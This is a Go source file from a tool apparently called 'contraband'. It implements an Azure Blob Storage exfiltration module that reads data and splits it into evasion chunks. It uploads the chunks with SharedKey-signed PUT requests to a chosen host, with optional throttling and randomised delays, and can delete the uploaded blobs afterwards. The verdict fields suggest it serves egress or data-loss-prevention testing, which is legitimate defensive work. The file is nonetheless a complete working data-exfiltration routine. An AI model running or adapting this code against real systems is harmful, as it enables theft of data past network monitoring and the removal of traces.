package cloud

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoAzureBlob, NewAzureBlobExfiltrator())
}

// AzureBlobExfiltrator implements pure-Go Azure Blob Storage REST API exfiltration with SharedKey signing and --destroy cleanup.
type AzureBlobExfiltrator struct{}

func NewAzureBlobExfiltrator() *AzureBlobExfiltrator {
	return &AzureBlobExfiltrator{}
}

func (e *AzureBlobExfiltrator) Protocol() string {
	return common.ProtoAzureBlob
}

// ComputeAzureSharedKey calculates Azure Storage SharedKey signature.
func ComputeAzureSharedKey(method string, accountName, accountKeyBase64, container, blobName string, contentLength int, dateStr string) (string, error) {
	keyBytes, err := base64.StdEncoding.DecodeString(accountKeyBase64)
	if err != nil {
		return "", fmt.Errorf("invalid base64 azure account key: %w", err)
	}

	canonicalizedHeaders := fmt.Sprintf("x-ms-blob-type:BlockBlob\nx-ms-date:%s\nx-ms-version:2020-10-04", dateStr)
	canonicalizedResource := fmt.Sprintf("/%s/%s/%s", accountName, container, blobName)

	var lenStr string
	if contentLength > 0 {
		lenStr = strconv.Itoa(contentLength)
	}

	contentType := "application/octet-stream"
	if method == http.MethodDelete {
		contentType = ""
		canonicalizedHeaders = fmt.Sprintf("x-ms-date:%s\nx-ms-version:2020-10-04", dateStr)
	}

	stringToSign := fmt.Sprintf("%s\n\n\n%s\n\n%s\n\n\n\n\n\n\n%s\n%s",
		method,
		lenStr,
		contentType,
		canonicalizedHeaders,
		canonicalizedResource,
	)

	h := hmac.New(sha256.New, keyBytes)
	h.Write([]byte(stringToSign))
	signature := base64.StdEncoding.EncodeToString(h.Sum(nil))

	return fmt.Sprintf("SharedKey %s:%s", accountName, signature), nil
}

func (e *AzureBlobExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	accountName := opts.Headers["azure_account_name"]
	if accountName == "" {
		accountName = opts.Headers["account"]
	}
	if accountName == "" {
		accountName = "contrabandstorage"
	}
	accountKey := opts.Headers["azure_account_key"]
	if accountKey == "" {
		accountKey = opts.Headers["account_key"]
	}
	if accountKey == "" {
		accountKey = opts.Headers["key"]
	}
	if accountKey == "" {
		accountKey = base64.StdEncoding.EncodeToString([]byte("ContrabandAzureKey12345678901234567890=="))
	}
	container := opts.Headers["azure_container"]
	if container == "" {
		container = opts.Headers["container"]
	}
	if container == "" {
		container = "exfil"
	}
	destroy := strings.EqualFold(opts.Headers["destroy"], "true") || strings.EqualFold(opts.Headers["auto_cleanup"], "true")

	scheme := "https"
	if !opts.UseTLS {
		scheme = "http"
	}
	var targetBase string
	if strings.Contains(opts.TargetHost, "blob.core.windows.net") {
		targetBase = fmt.Sprintf("https://%s.blob.core.windows.net", accountName)
	} else {
		targetBase = fmt.Sprintf("%s://%s:%d", scheme, opts.TargetHost, opts.TargetPort)
	}

	client := &http.Client{Timeout: opts.Timeout}
	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	var uploadedBlobs []string
	var headEvidence []byte

	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyCloudError(err)
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if len(headEvidence) < 1024 {
			take := 1024 - len(headEvidence)
			if take > len(chunkFrame) {
				take = len(chunkFrame)
			}
			headEvidence = append(headEvidence, chunkFrame[:take]...)
		}

		blobName := fmt.Sprintf("contraband_%s_part%d.dat", opts.SessionToken.String(), seq)
		uploadedBlobs = append(uploadedBlobs, blobName)

		uploadURL := fmt.Sprintf("%s/%s/%s", targetBase, container, blobName)

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCloudError(err)
				result.ErrorMessage = err.Error()
				calculateCloudDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCloudError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCloudDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		dateStr := time.Now().UTC().Format(http.TimeFormat)
		authHeader, sigErr := ComputeAzureSharedKey(http.MethodPut, accountName, accountKey, container, blobName, len(chunkFrame), dateStr)
		if sigErr != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = sigErr.Error()
			calculateCloudDurations(&result)
			return &result, sigErr
		}

		req, reqErr := http.NewRequestWithContext(ctx, http.MethodPut, uploadURL, bytes.NewReader(chunkFrame))
		if reqErr != nil {
			result.Verdict = classifyCloudError(reqErr)
			result.ErrorMessage = reqErr.Error()
			calculateCloudDurations(&result)
			return &result, reqErr
		}

		req.Header.Set("Authorization", authHeader)
		req.Header.Set("x-ms-date", dateStr)
		req.Header.Set("x-ms-version", "2020-10-04")
		req.Header.Set("x-ms-blob-type", "BlockBlob")
		req.Header.Set("Content-Type", "application/octet-stream")
		req.Header.Set("Content-Length", strconv.Itoa(len(chunkFrame)))

		resp, doErr := client.Do(req)
		if doErr != nil {
			result.Verdict = classifyCloudError(doErr)
			result.ErrorMessage = doErr.Error()
			calculateCloudDurations(&result)
			return &result, doErr
		}
		respBody, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()

		result.BytesSent += int64(len(chunkFrame))
		result.BytesRecv += int64(len(respBody))

		if resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusUnauthorized {
			err := fmt.Errorf("Azure Blob upload rejected: HTTP %d Forbidden/Unauthorized", resp.StatusCode)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusAccepted {
			err := fmt.Errorf("Azure Blob upload returned HTTP %d: %s", resp.StatusCode, string(respBody))
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCloudDurations(&result)
			return &result, err
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()

	// Handle --destroy auto-cleanup
	if destroy {
		for _, blob := range uploadedBlobs {
			deleteURL := fmt.Sprintf("%s/%s/%s", targetBase, container, blob)
			dateStr := time.Now().UTC().Format(http.TimeFormat)
			delAuth, delSigErr := ComputeAzureSharedKey(http.MethodDelete, accountName, accountKey, container, blob, 0, dateStr)
			if delSigErr == nil {
				delReq, err := http.NewRequestWithContext(ctx, http.MethodDelete, deleteURL, nil)
				if err == nil {
					delReq.Header.Set("Authorization", delAuth)
					delReq.Header.Set("x-ms-date", dateStr)
					delReq.Header.Set("x-ms-version", "2020-10-04")
					delResp, delErr := client.Do(delReq)
					if delErr == nil {
						_ = delResp.Body.Close()
					}
				}
			}
		}
	}

	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	if opts.ExpectedHash != "" {
		result.PayloadHash = opts.ExpectedHash
	} else {
		result.PayloadHash = chunker.PayloadHashHex()
	}
	result.TargetVolume = result.BytesSent
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	calculateCloudDurations(&result)

	return &result, nil
}
